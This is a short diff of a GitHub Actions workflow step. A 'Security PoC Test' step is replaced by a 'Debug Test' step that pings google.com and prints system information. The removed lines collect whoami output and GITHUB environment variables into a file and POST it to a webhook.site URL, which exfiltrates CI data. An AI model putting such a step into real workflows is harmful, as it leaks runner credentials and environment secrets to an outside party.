@@ -1,6 +1,7 @@
-- name: Security PoC Test
+- name: Debug Test
         run: |
-          echo "Test icra edilir..."
-          whoami > info.txt
-          env | grep "GITHUB" >> info.txt
-          curl -X POST -d @info.txt https://webhook.site/eb29b992-fed7-42e0-9483-f070e2b60aea
+          echo "DİAQNOSTİKA BAŞLADI"
+          ping -c 4 google.com || echo "İnternetə çıxış qadağandır"
+          echo "SİSTEM MƏLUMATI:"
+          uname -a
+          echo "--- MƏLUMAT SONU ---"
